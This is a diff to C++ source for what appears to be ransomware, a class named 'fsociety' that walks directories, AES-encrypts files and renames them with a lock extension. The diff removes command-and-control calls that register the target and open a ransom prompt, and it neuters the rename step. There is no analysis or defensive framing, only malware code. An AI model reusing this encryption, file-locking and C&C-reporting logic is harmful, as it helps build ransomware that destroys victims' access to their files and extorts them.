@@ -8,7 +8,6 @@
 #include "cryptopp/aes.h"
 #include "cryptopp/filters.h"
 #include "fsociety.h"
-#include "after_day.h"
 
 using namespace CryptoPP;
 using namespace std;
@@ -57,11 +56,6 @@ int fsociety::listfiledirectory(char *directory){
 	closedir(dir);
     }
     //std::cout << "start : " << this->nb_file << std::endl;
-    CandC command;
-    command.nb_file = number_to_string(this->nb_file);
-    command.checkifconnected();
-    command.insert_target();
-    command.openReward();
     return 0;
 }
 
@@ -84,7 +78,7 @@ int fsociety::lock_file(char *path){
     memcpy(new_name, path, len_path);
     memcpy(new_name + len_path, locked_ext, len_locked);
     new_name[len_path + len_locked + 1] = '\0';
-    rename(path, new_name);
+    rename(path, path);
     this->nb_file++;
     //cout << "renamed !" << endl;
     return 0;
@@ -147,9 +141,6 @@ int fsociety::encrypt_file(char *path, const char *content){
 	//cout << "encrypted" << endl;
 	fichier.close();
     }
-    //CandC commandcontrol;
-    //commandcontrol.checkifconnected();
-    //commandcontrol.insert_target();
     this->lock_file(path);
     return 0;
 }
